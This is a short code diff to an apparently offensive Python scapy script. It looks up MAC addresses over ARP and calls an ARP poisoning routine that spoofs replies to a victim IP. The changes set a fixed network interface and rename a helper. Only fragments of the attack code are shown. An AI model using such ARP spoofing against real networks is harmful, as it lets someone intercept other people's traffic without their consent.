@@ -1,9 +1,10 @@
 from scapy.all import *
 
 #get MAC from ip
+#for demo purposes, interface enp0s3 is used
 def getmac(ip):
     packet = Ether() / ARP(op = ARP.who_has, pdst = ip)
-    ans = srp1(packet, verbose = False, timeout = 10)
+    ans = srp1(packet, verbose = False, timeout = 10, iface = 'enp0s3')
     if ans[ARP] and ans[ARP].hwsrc:
         return ans[ARP].hwsrc
     else:
@@ -37,5 +38,5 @@ def arppoison(victimIP, ipToSpoof, attackerIP):
         print colores.ORANGE + 'Cannot find MAC address of victim\n' + colores.RED + 'End of program' + colores.RESETALL
         sys.exit()
     #for demo, suppose enp0s3 interface is used
-    attackerMAC = getattackermac()
+    attackerMAC = gethostmac()
     arpspoof(attackerMAC, victimMAC, ipToSpoof, victimIP)
